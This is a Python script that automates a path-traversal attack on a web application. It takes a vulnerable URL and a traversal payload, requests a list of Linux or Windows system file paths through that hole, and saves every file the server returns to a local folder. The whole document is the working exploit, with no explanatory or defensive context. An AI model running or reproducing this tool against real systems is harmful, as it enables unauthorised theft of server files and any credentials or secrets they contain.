import requests
from pathlib import Path


print("set Vulnerable Path(ex: https://www.webapp.com/path/vul/)")
urlpath= input()
print({urlpath})
print("set payload (ex: ../../ )")
payload= input()
print({payload})
print("set OS, 1) Linux, 2) Windows")
os= int(input())
print("set name output dir")
output_dir= str(input())
print({output_dir})

path = Path(output_dir)
path.mkdir(parents=True)



if os == 1:
    files = open('./linux_paths.txt')
    while(True):
      line = files.readline()
      line = line.replace('\n','')
      r = requests.get(urlpath+payload+line)
      print (r.url)
      print (r.status_code)
      if r.status_code == 200:
          name = line.replace("/","-")
          file = open(output_dir+"/"+name, "w+")
          file.write(str(r.text))
          file.close()
      else:
          print("not ok")
      if not line:
          break
    files.close()

else:
    files = open('./windows_paths.txt')
    while(True):
      line = files.readline()
      line = line.replace('\n','')
      r = requests.get(urlpath+payload+"/"+line)
      print (r.url)
      print (r.status_code)
      if r.status_code == 200:
          name = line.replace("/","-")
          file = open(output_dir+"/"+name, "w+")
          file.write(str(r.text))
          file.close()
      else:
          print("not ok")
      if not line:
          break
    files.close()